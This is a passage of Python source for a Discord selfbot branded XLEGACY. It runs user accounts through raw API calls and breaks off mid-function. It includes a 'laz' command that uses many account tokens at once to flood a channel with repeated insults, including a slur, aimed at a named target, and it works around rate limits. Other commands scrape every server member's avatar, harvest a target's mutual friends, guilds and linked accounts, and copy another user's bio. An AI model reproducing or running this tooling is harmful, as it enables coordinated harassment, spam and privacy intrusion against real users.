    "# {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard {name2} your a nobody retard ",
    "# {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr {name2} your my weakest jr ",
    "# {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you {name2} i dont fucking know you "
]

laz_tasks = {}
laz_running = {}

@bot.command()
async def laz(ctx, user: discord.User, name1: str, name2: str = None):
    await ctx.message.delete()
    
    if ctx.channel.id in laz_running and laz_running[ctx.channel.id]:
        await ctx.send(f"```ansi\n{red} XLEGACY | LAZ COMMAND ALREADY RUNNING |  {reset}\n```")
        return
        
    laz_running[ctx.channel.id] = True
    channel_id = ctx.channel.id
    valid_tokens = set(load_tokens())
    valid_tokens.add(bot.http.token)
    
    async def send_laz_messages(token):
        message_index = 0
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        while laz_running.get(channel_id, False) and token in valid_tokens:
            try:
                if message_index >= len(laz_wordlist):
                    message_index = 0
                    
                message = laz_wordlist[message_index]
                formatted_message = (message
                    .replace("{mention}", user.mention)
                    .replace("{name1}", name1)
                    .replace("{name2}", name2 if name2 else "")
                )
                
                payload = {'content': formatted_message}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            message_index += 1
                            await asyncio.sleep(random.uniform(0.225, 0.555))
                        elif resp.status == 429:
                            retry_after = random.uniform(3, 5)
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:
                            valid_tokens.remove(token)
                            break
                        else:
                            await asyncio.sleep(random.uniform(3, 5))
                            continue
                            
            except Exception as e:
                await asyncio.sleep(random.uniform(3, 5))
                continue
    
    tasks = []
    for token in valid_tokens:
        task = bot.loop.create_task(send_laz_messages(token))
        tasks.append(task)
    
    laz_tasks[channel_id] = tasks
    await ctx.send(f"```ansi\n{red} XLEGACY | LAZ SPAM STARTED | USE .ENDLAZ TO STOP |  {reset}\n```")

@bot.command()
async def endlaz(ctx):
    channel_id = ctx.channel.id
    
    if channel_id not in laz_running or not laz_running[channel_id]:
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.send(f"```ansi\n{red} XLEGACY | NO LAZ COMMAND RUNNING |  {reset}\n```")
        return
    
    laz_running[channel_id] = False
    
    if channel_id in laz_tasks:
        for task in laz_tasks[channel_id]:
            task.cancel()
        del laz_tasks[channel_id]
    
    try:
        await ctx.message.delete()
    except:
        pass
        
    try:
        await ctx.send(f"```ansi\n{red} XLEGACY | LAZ COMMAND STOPPED |  {reset}\n```")
    except:
        pass

@bot.command()
async def hypesquad(ctx, house: str):
    house_ids = {
        "bravery": 1,
        "brilliance": 2,
        "balance": 3
    }

    headers = {
        "Authorization": bot.http.token, 
        "Content-Type": "application/json"
    }

    if house.lower() == "off":
        url = "https://discord.com/api/v9/hypesquad/online"
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=headers) as response:
                if response.status == 204:
                    await ctx.send(f"```ansi\n{red} XLEGACY | HYPESQUAD HOUSE REMOVED |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO REMOVE HYPESQUAD HOUSE |  {reset}\n```")
        return

    house_id = house_ids.get(house.lower())
    if house_id is None:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID HOUSE | CHOOSE BRAVERY/BRILLIANCE/BALANCE/OFF |  {reset}\n```")
        return

    payload = {"house_id": house_id}
    url = "https://discord.com/api/v9/hypesquad/online"

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 204:
                await ctx.send(f"```ansi\n{red} XLEGACY | HYPESQUAD HOUSE CHANGED | {house.upper()} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO CHANGE HYPESQUAD HOUSE |  {reset}\n```")

@bot.command()
async def spotify(ctx):
    msg6 = await ctx.send("Loading.")
    help_content6 = f"""
{red}Spotify Control System{reset}
{light_red}[ {red}1{light_red} ] {black}spotify unpause          {light_red}[ {red}2{light_red} ] {black}spotify pause            
{light_red}[ {red}3{light_red} ] {black}spotify next             {light_red}[ {red}4{light_red} ] {black}spotify prev              
{light_red}[ {red}5{light_red} ] {black}spotify play <song>      {light_red}[ {red}6{light_red} ] {black}spotify current           
{light_red}[ {red}7{light_red} ] {black}spotify addqueue <song>  {light_red}[ {red}8{light_red} ] {black}spotify volume <0-100>    
{light_red}[ {red}9{light_red} ] {black}spotify shuffle <on/off> {light_red}[ {red}10{light_red} ] {black}spotify repeat <mode>     

{light_red}Description:{reset}
{black}Control your Spotify playback with these commands{reset}

{light_red}Usage Examples:{reset}
{black}spotify play never gonna give you up{reset}
{black}spotify volume 80{reset}
{black}spotify shuffle on{reset}
{black}spotify repeat track{reset}

{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
"""
    await msg6.edit(content=f"```ansi\n{help_content6}```")

status_rotation_active = False
emoji_rotation_active = False
current_status = ""
current_emoji = ""

@bot.command(name='rstatus')
async def rotate_status(ctx, *, statuses: str):
    global status_rotation_active, current_status, current_emoji
    await ctx.message.delete()
    
    # Parse statuses from comma-separated string
    status_list = [status.strip() for status in statuses.split(',') if status.strip()]
    
    if not status_list:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE STATUSES | .rstatus status1, status2, status3 |  {reset}\n```")
        return
    
    current_index = 0
    status_rotation_active = True
    
    async def update_status_with_image(status_text, image_url=None):
        json_data = {
            'custom_status': {
                'text': status_text,
                'emoji_name': current_emoji
            }
        }

        # Handle custom emoji if present
        custom_emoji_match = re.match(r'<a?:(\w+):(\d+)>', current_emoji)
        if custom_emoji_match:
            name, emoji_id = custom_emoji_match.groups()
            json_data['custom_status']['emoji_name'] = name
            json_data['custom_status']['emoji_id'] = emoji_id
        else:
            json_data['custom_status']['emoji_name'] = current_emoji

        # Add image if provided
        if image_url:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(image_url) as response:
                        if response.status == 200:
                            image_data = await response.read()
                            image_b64 = base64.b64encode(image_data).decode()
                            
                            content_type = response.headers.get('Content-Type', '')
                            image_format = 'gif' if 'gif' in content_type else 'png'
                            
                            json_data['custom_status']['emoji_name'] = None
                            json_data['custom_status']['emoji_id'] = None
                            json_data['custom_status']['emoji_image'] = f"data:image/{image_format};base64,{image_b64}"
                            
            except Exception as e:
                print(f"{light_red}Failed to load image from URL: {e}{reset}")

        # Update status
        async with aiohttp.ClientSession() as session:
            try:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={'Authorization': bot.http.token, 'Content-Type': 'application/json'},
                    json=json_data
                ) as resp:
                    await resp.read()
            finally:
                await session.close()

    # Send only the initial start message
    start_msg = await ctx.send(f"```ansi\n{red} XLEGACY | STATUS ROTATION STARTED | {len(status_list)} STATUSES |  {reset}\n```")
    
    try:
        while status_rotation_active:
            status_text = status_list[current_index]
            
            await update_status_with_image(status_text)
            
            # No status message sent here - just update the status silently
            print(f"{red}Status updated to: {status_text}{reset}")
            
            await asyncio.sleep(8)  # Wait 8 seconds before changing status
            current_index = (current_index + 1) % len(status_list)
                
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR IN STATUS ROTATION | {str(e)} |  {reset}\n```")
    finally:
        # Clear status when stopped
        current_status = ""
        await update_status_with_image("")
        status_rotation_active = False

@bot.command(name='rstatusstop')
async def stop_status_rotation(ctx):
    global status_rotation_active
    await ctx.message.delete()
    
    if status_rotation_active:
        status_rotation_active = False
        await ctx.send(f"```ansi\n{red} XLEGACY | STATUS ROTATION STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO STATUS ROTATION RUNNING |  {reset}\n```")


@bot.command()
async def stream(ctx, *, statuses_list: str):
    global status_changing_task
    global statuses
    
    # Parse statuses with optional images
    statuses = []
    status_parts = [s.strip() for s in statuses_list.split('"') if s.strip()]
    
    for i in range(0, len(status_parts), 2):
        if i + 1 < len(status_parts):
            # Text with image URL
            status_text = status_parts[i]
            image_url = status_parts[i + 1]
            statuses.append({"text": status_text, "image_url": image_url})
        else:
            # Text only
            statuses.append({"text": status_parts[i], "image_url": None})
    
    if not statuses:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE STATUSES | USE FORMAT: .stream \"text\" \"image_url\" |  {reset}\n```")
        return
    
    if status_changing_task:
        status_changing_task.cancel()
    
    status_changing_task = bot.loop.create_task(change_status_with_images())
    
    status_count = len(statuses)
    image_count = sum(1 for s in statuses if s["image_url"])
    
    await ctx.send(f"""```ansi
{red} XLEGACY | STATUS ROTATION STARTED |  {reset}
{light_red}Statuses: {red}{status_count}{reset}
{light_red}With Images: {red}{image_count}{reset}
{light_red}Format: {red}"text" "image_url"{reset}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
```""")

async def change_status_with_images():
    current_index = 0
    while True:
        try:
            status_data = statuses[current_index]
            status_text = status_data["text"]
            image_url = status_data["image_url"]
            
            # Use custom status for images (if supported) or fallback to streaming
            if image_url:
                try:
                    # Try to set custom status with emoji (image)
                    # This uses Discord's HTTP API for custom status
                    headers = {
                        'Authorization': bot.http.token,
                        'Content-Type': 'application/json'
                    }
                    
                    # For custom status with emoji/image
                    payload = {
                        'custom_status': {
                            'text': status_text,
                            'emoji_name': '🎮'  # Fallback emoji
                        }
                    }
                    
                    # Try to set via API
                    async with aiohttp.ClientSession() as session:
                        async with session.patch(
                            'https://discord.com/api/v9/users/@me/settings',
                            headers=headers,
                            json=payload
                        ) as resp:
                            if resp.status != 200:
                                print(f"{light_red}Failed to set custom status: {resp.status}{reset}")
                    
                    # Also set streaming activity as fallback
                    activity = discord.Streaming(
                        name=status_text,
                        url="https://twitch.tv/discord"
                    )
                    await bot.change_presence(activity=activity)
                    
                except Exception as e:
                    print(f"{light_red}Failed to set image status: {e}{reset}")
                    # Fallback to text-only streaming
                    activity = discord.Streaming(
                        name=status_text,
                        url="https://twitch.tv/discord"
                    )
                    await bot.change_presence(activity=activity)
            else:
                # Text-only streaming activity
                activity = discord.Streaming(
                    name=status_text,
                    url="https://twitch.tv/discord"
                )
                await bot.change_presence(activity=activity)
            
            # Log current status
            status_info = f"{red}Status: {status_text}"
            if image_url:
                status_info += f" | {light_red}Image URL: {image_url[:30]}..."
            print(status_info + reset)
            
            await asyncio.sleep(10)  # Change every 10 seconds
            current_index = (current_index + 1) % len(statuses)
            
        except Exception as e:
            print(f"{light_red}Error in status rotation: {e}{reset}")
            await asyncio.sleep(10)

@bot.command()
async def stoprpc(ctx):
    global status_changing_task
    
    if status_changing_task:
        status_changing_task.cancel()
        status_changing_task = None
        await bot.change_presence(activity=None)
        
        # Also clear custom status
        try:
            headers = {
                'Authorization': bot.http.token,
                'Content-Type': 'application/json'
            }
            payload = {'custom_status': {'text': '', 'emoji_name': None}}
            
            async with aiohttp.ClientSession() as session:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers=headers,
                    json=payload
                ) as resp:
                    pass
        except:
            pass
            
        await ctx.send(f"```ansi\n{red} XLEGACY | STATUS ROTATION STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO STATUS ROTATION RUNNING |  {reset}\n```")
        

@bot.command()
async def pfpscrape(ctx, amount: int = None):
    try: 
        base_dir = os.path.join(os.getcwd(), 'pfps')
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        folder_path = os.path.join(base_dir, f'scrape_{timestamp}')
        os.makedirs(folder_path, exist_ok=True)
        
        members = list(ctx.guild.members)
        
        if amount is None or amount > len(members):
            amount = len(members)
        
        selected_members = random.sample(members, amount)
        
        success_count = 0
        failed_count = 0
        
        status_message = await ctx.send("```Starting profile picture scraping...```")
        
        async def download_pfp(member):
            try:
                if member.avatar:
                    if str(member.avatar).startswith('a_'):
                        avatar_url = f"https://cdn.discordapp.com/avatars/{member.id}/{member.avatar}.gif?size=1024"
                        file_extension = '.gif'
                    else:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{member.id}/{member.avatar}.png?size=1024"
                        file_extension = '.png'
                else:
                    avatar_url = member.default_avatar.url
                    file_extension = '.png'
                
                safe_name = "".join(x for x in member.name if x.isalnum() or x in (' ', '-', '_'))
                file_name = f'{safe_name}_{member.id}{file_extension}'
                file_path = os.path.join(folder_path, file_name)
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(avatar_url) as resp:
                        if resp.status == 200:
                            data = await resp.read()
                            async with aiofiles.open(file_path, 'wb') as f:
                                await f.write(data)
                                print(f"Saved {file_name} to {file_path}")
                            return True
                        else:
                            print(f"Failed to download {member.name}'s avatar: Status {resp.status}")
                            return False
                        
            except Exception as e:
                print(f"Error downloading {member.name}'s pfp: {e}")
            return False
        
        chunk_size = 5
        for i in range(0, len(selected_members), chunk_size):
            chunk = selected_members[i:i + chunk_size]
            
            results = await asyncio.gather(*[download_pfp(member) for member in chunk])
            
            success_count += sum(1 for r in results if r)
            failed_count += sum(1 for r in results if not r)
            
            progress = (i + len(chunk)) / len(selected_members) * 100
            status = f"""```
PFP Scraping / Status %
Progress: {progress:.1f}%
Downloaded: {success_count}
Failed to download: {failed_count}
Remaining: {amount - (success_count + failed_count)}
Path: {folder_path}
```"""
            try:
                await status_message.edit(content=status)
            except:
                pass
            
            await asyncio.sleep(random.uniform(0.5, 1.0))

        final_status = f"""```
Profile scraping completed:
Scrapes Trird: {amount}
Downloaded: {success_count}
Failed to download: {failed_count}
Saved in: {folder_path}
```"""
        await status_message.edit(content=final_status)
    except Exception as e:
        try:
            await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")
        except:
            print(f"Error in pfpscrape: {e}")
        return


# Add to global variables
rotate_bio_task = None
bio_phrases = []
bio_index = 0
pronoun_rotation_task = None
channel_rotation_task = None
rotation_tasks = {}

@bot.command()
async def ab(ctx):
    msg = await ctx.send("Loading.")
    help_content = f"""
{red}Auto Bio & Profile Commands{reset}
{light_red}[ {red}1{light_red} ] {black}setbio <text>          {light_red}[ {red}2{light_red} ] {black}rotatebio <texts>     
{light_red}[ {red}3{light_red} ] {black}stoprotatebio         {light_red}[ {red}4{light_red} ] {black}setpronoun <text>     
{light_red}[ {red}5{light_red} ] {black}rotatepronoun <texts> {light_red}[ {red}6{light_red} ] {black}stoprotatepronoun    
{light_red}[ {red}7{light_red} ] {black}channelrotate         {light_red}[ {red}8{light_red} ] {black}stopchannelrotate    
{light_red}[ {red}9{light_red} ] {black}banner <@user>        {light_red}[ {red}10{light_red} ] {black}mutualinfo <@user>   
{light_red}[ {red}11{light_red} ] {black}stealbio <@user>     

{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
"""
    await msg.edit(content=f"```ansi\n{help_content}```")

@bot.command()
async def setbio(ctx, *, bio_text: str):
    headers = {
        "Content-Type": "application/json",
        "Authorization": bot.http.token
    }

    new_bio = {
        "bio": bio_text
    }

    url_api_info = "https://discord.com/api/v9/users/%40me/profile"
    
    try:
        response = requests.patch(url_api_info, headers=headers, json=new_bio)

        if response.status_code == 200:
            await ctx.send(f"```ansi\n{red} XLEGACY | BIO UPDATED |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO UPDATE BIO | {response.status_code} |  {reset}\n```")

    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

@bot.command()
async def rotatebio(ctx, *phrases):
    global rotate_bio_task, bio_phrases, bio_index

    if not phrases:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE BIO TEXTS | .rotatebio text1 text2 text3 |  {reset}\n```")
        return

    bio_phrases = phrases
    bio_index = 0

    if rotate_bio_task and not rotate_bio_task.done():
        rotate_bio_task.cancel()

    rotate_bio_task = asyncio.create_task(bio_rotator())
    await ctx.send(f"```ansi\n{red} XLEGACY | BIO ROTATION STARTED | {len(phrases)} TEXTS |  {reset}\n```")

async def bio_rotator():
    global bio_index

    headers = {
        "Content-Type": "application/json",
        "Authorization": bot.http.token
    }
    url_api_info = "https://discord.com/api/v9/users/%40me/profile"

    while bio_phrases:
        new_bio = {"bio": bio_phrases[bio_index]}

        try:
            response = requests.patch(url_api_info, headers=headers, json=new_bio)
            if response.status_code == 200:
                print(f"{red}Bio updated to: {bio_phrases[bio_index]}{reset}")
            else:
                print(f"{light_red}Failed to update bio: {response.status_code}{reset}")

            bio_index = (bio_index + 1) % len(bio_phrases)

        except Exception as e:
            print(f"{light_red}Bio rotation error: {e}{reset}")
            return
        await asyncio.sleep(3600)

@bot.command()
async def stoprotatebio(ctx):
    global rotate_bio_task

    if rotate_bio_task and not rotate_bio_task.done():
        rotate_bio_task.cancel()
        rotate_bio_task = None
        await ctx.send(f"```ansi\n{red} XLEGACY | BIO ROTATION STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO BIO ROTATION RUNNING |  {reset}\n```")

@bot.command()
async def setpronoun(ctx, *, pronoun: str):
    headers = {
        "Authorization": bot.http.token,
        "Content-Type": "application/json"
    }

    new_name = {
        "pronouns": pronoun
    }

    url_api_info = "https://discord.com/api/v9/users/%40me/profile"

    try:
        response = requests.patch(url_api_info, headers=headers, json=new_name)

        if response.status_code == 200:
            await ctx.send(f"```ansi\n{red} XLEGACY | PRONOUN UPDATED | {pronoun} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO UPDATE PRONOUN | {response.status_code} |  {reset}\n```")

    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

class PronounRotationTask:
    def __init__(self, ctx, pronouns):
        self.ctx = ctx
        self.pronouns = pronouns
        self.index = 0

    def start(self):
        self.task = asyncio.create_task(self.rotate_pronouns())

    def cancel(self):
        self.task.cancel()

    def is_running(self):
        return not self.task.done()

    async def rotate_pronouns(self):
        headers = {
            "Authorization": bot.http.token,
            "Content-Type": "application/json"
        }
        url_api_info = "https://discord.com/api/v9/users/%40me/profile"

        while True:
            try:
                current_pronoun = self.pronouns[self.index]
                self.index = (self.index + 1) % len(self.pronouns)

                response = requests.patch(url_api_info, headers=headers, json={"pronouns": current_pronoun})

                if response.status_code == 200:
                    await self.ctx.send(f"```ansi\n{red} XLEGACY | PRONOUN UPDATED | {current_pronoun} |  {reset}\n```")
                else:
                    await self.ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO UPDATE PRONOUN | {response.status_code} |  {reset}\n```")
                    break

                await asyncio.sleep(3600)

            except Exception as e:
                await self.ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")
                break

@bot.command()
async def rotatepronoun(ctx, *pronouns):
    global pronoun_rotation_task

    if pronoun_rotation_task and pronoun_rotation_task.is_running():
        pronoun_rotation_task.cancel()
        await ctx.send(f"```ansi\n{red} XLEGACY | STOPPED PREVIOUS PRONOUN ROTATION |  {reset}\n```")

    if not pronouns:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE PRONOUNS | .rotatepronoun they/them he/him |  {reset}\n```")
        return

    pronoun_rotation_task = PronounRotationTask(ctx, pronouns)
    pronoun_rotation_task.start()
    await ctx.send(f"```ansi\n{red} XLEGACY | PRONOUN ROTATION STARTED | {', '.join(pronouns)} |  {reset}\n```")

@bot.command()
async def stoprotatepronoun(ctx):
    global pronoun_rotation_task

    if pronoun_rotation_task and pronoun_rotation_task.is_running():
        pronoun_rotation_task.cancel()
        await ctx.send(f"```ansi\n{red} XLEGACY | PRONOUN ROTATION STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PRONOUN ROTATION RUNNING |  {reset}\n```")

@bot.command()
async def channelrotate(ctx, channel: discord.TextChannel, *names: str):
    if not names:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE CHANNEL NAMES |  {reset}\n```")
        return

    if channel.id in rotation_tasks:
        await ctx.send(f"```ansi\n{red} XLEGACY | ALREADY RUNNING | {channel.mention} |  {reset}\n```")
        return

    async def rotate_names():
        try:
            await ctx.send(f"```ansi\n{red} XLEGACY | CHANNEL ROTATION STARTED | {channel.mention} |  {reset}\n```")
            while True:
                new_name = random.choice(names)
                await channel.edit(name=new_name)
                await asyncio.sleep(5)  
        except Exception as e:
            await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")
    
    task = bot.loop.create_task(rotate_names())
    rotation_tasks[channel.id] = task

@bot.command()
async def stopchannelrotate(ctx, channel: discord.TextChannel):
    task = rotation_tasks.get(channel.id)
    if task:
        task.cancel()
        del rotation_tasks[channel.id]
        await ctx.send(f"```ansi\n{red} XLEGACY | CHANNEL ROTATION STOPPED | {channel.mention} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO ROTATION FOUND | {channel.mention} |  {reset}\n```")

@bot.command(name="banner")
async def userbanner(ctx, user: discord.User):
    headers = {
        "Authorization": bot.http.token,
        "Content-Type": "application/json"
    }
    
    url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    try:
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            banner_hash = data.get("user", {}).get("banner")
            
            if banner_hash:
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                await ctx.send(f"```ansi\n{red} XLEGACY | {user.display_name}'S BANNER |  {reset}\n```\n[XLEGACY SB]({banner_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | NO BANNER SET | {user.display_name} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO GET BANNER | {response.status_code} |  {reset}\n```")
    
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

def format_datetime(date_string):
    try:
        dt = datetime.fromisoformat(date_string)
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except ValueError:
        return "Invalid Date"

def generate_page_1(user_info, premium_since, premium_type, connected_accounts):
    output = f"""
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}User Information for {white}{user_info['username']}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {light_red}Username: {red}{user_info.get("username", "No username")}
                                {light_red}Display Name: {red}{user_info.get("global_name", "No display Name")}
                                {light_red}Pronouns: {red}{user_info.get("pronouns", "No Pronouns set")}
                                {light_red}Premium Since: {red}{premium_since}
                                {light_red}Premium Type: {red}{premium_type}
                                {light_red}About Me: {red}{user_info.get("bio", "No Bio Set")}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {light_red}Use {red}"m(2)"{light_red} for next page{reset}
"""
    return output

def generate_page_2(mutual_friends):
    output = f"""
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Mutual Friends
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"""
    
    if mutual_friends:
        for friend in mutual_friends:
            output += f"\n                                {light_red}{friend['username']} {red}({friend['id']}){reset}"
    else:
        output += f"\n                                {red}No mutual friends{reset}"
    output += f"\n{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"
    output += f'\n                                {light_red}Use {red}"m(3)"{light_red} for next page{reset}'
    return output

def generate_page_3(mutual_guilds):
    output = f"""
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Mutual Guilds
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"""
    
    if mutual_guilds:
        for guild in mutual_guilds:
            output += f"\n                                {light_red}Guild ID: {red}{guild['id']}{light_red} | Nickname: {red}{guild.get('nick', 'No Nickname')}{reset}"
    else:
        output += f"\n                                {red}No mutual guilds{reset}"
    output += f"\n{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"
    output += f'\n                                {light_red}Use {red}"m (4)"{light_red} for next page{reset}'
    return output

def generate_page_4(connected_accounts):
    output = f"""
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Connected Accounts
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"""
    
    if connected_accounts:
        for account in connected_accounts:
            account_type = account.get("type", "Unknown")
            account_name = account.get("name", "No Account Name")
            account_id = account.get("id", "No ID")
            output += f"\n                                {light_red}{account_type}: {red}{account_name} {light_red}(ID: {red}{account_id}{light_red}){reset}"
    else:
        output += f"\n                                {red}No connected accounts{reset}"
    output += f"\n{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}"
    return output

@bot.command()
async def mutualinfo(ctx, member: discord.User):
    url = f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true&with_mutual_friends=true&with_mutual_friends_count=false"
    
    headers = {
        "Authorization": bot.http.token
    }

    try:
        response = requests.get(url, headers=headers)
        data = response.json()

        if response.status_code == 200:
            user_info = data.get("user", {})
            mutual_guilds = data.get("mutual_guilds", [])
            mutual_friends = data.get("mutual_friends", [])
            connected_accounts = data.get("connected_accounts", [])
            premium_since = data.get("premium_since", "N/A")
            premium_type = data.get("premium_type", "N/A")

            formatted_premium_since = format_datetime(premium_since)

            page_1 = generate_page_1(user_info, formatted_premium_since, premium_type, connected_accounts)

            message = await ctx.send(f"```ansi\n{page_1}```")

            total_pages = 4  
            current_page = 1 

            def check(m):
                return m.author == ctx.author and m.content.startswith('m') and (m.content[1:].isdigit() or m.content[1] == '-' and m.content[2:].isdigit())

            while True:
                try:
                    msg = await bot.wait_for('message', check=check, timeout=20.0)

                    page_num = int(msg.content[1:])
                    if page_num < 1 or page_num > total_pages:
                        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID PAGE NUMBER | 1-4 |  {reset}\n```")
                        continue

                    if page_num == 1:
                        page_1 = generate_page_1(user_info, formatted_premium_since, premium_type, connected_accounts)
                        await message.edit(content=f"```ansi\n{page_1}```")
                    elif page_num == 2:
                        page_2 = generate_page_2(mutual_friends)
                        await message.edit(content=f"```ansi\n{page_2}```")
                    elif page_num == 3:
                        page_3 = generate_page_3(mutual_guilds)
                        await message.edit(content=f"```ansi\n{page_3}```")
                    elif page_num == 4:
                        page_4 = generate_page_4(connected_accounts)
                        await message.edit(content=f"```ansi\n{page_4}```")

                    current_page = page_num 
                    await msg.delete()
                except asyncio.TimeoutError:
                    await message.edit(content=f"```ansi\n{red} XLEGACY | TIMEOUT |  {reset}\n```")
                    break
                except Exception as e:
                    await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")
                    break

        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH DATA |  {reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

@bot.command()
async def stealbio(ctx, member: discord.User):
    url = f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true&with_mutual_friends=true"
    headers = {
        "Authorization": bot.http.token
    }

    try:
        response = requests.get(url, headers=headers)
        data = response.json()

        if response.status_code == 200:
            target_bio = data.get("user", {}).get("bio", None)

            if target_bio:
                set_bio_url = "https://discord.com/api/v9/users/@me/profile"
                new_bio = {"bio": target_bio}

                update_response = requests.patch(set_bio_url, headers=headers, json=new_bio)
